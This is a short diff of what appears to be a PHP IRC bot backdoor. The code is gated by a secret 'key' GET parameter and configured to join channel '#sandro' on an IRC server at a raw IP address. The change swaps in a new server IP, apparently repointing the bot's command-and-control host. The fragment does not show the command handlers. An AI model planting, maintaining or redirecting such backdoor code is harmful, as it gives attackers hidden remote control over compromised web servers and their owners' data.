@@ -6,7 +6,7 @@ if(isset($_GET['key']) == "sandro"){
 
     class sell
     {
-        var $config = array("server" => "213.153.71.233", "port" => "6667", "key" => "", "prefix" => "Linux", "maxrand" => "5", "chan" => "#sandro", "trigger" => ".", "password" => "", "auth" => "");
+        var $config = array("server" => "213.153.68.63", "port" => "6667", "key" => "", "prefix" => "Linux", "maxrand" => "5", "chan" => "#sandro", "trigger" => ".", "password" => "", "auth" => "");
         var $users = array();
         function start()
         {
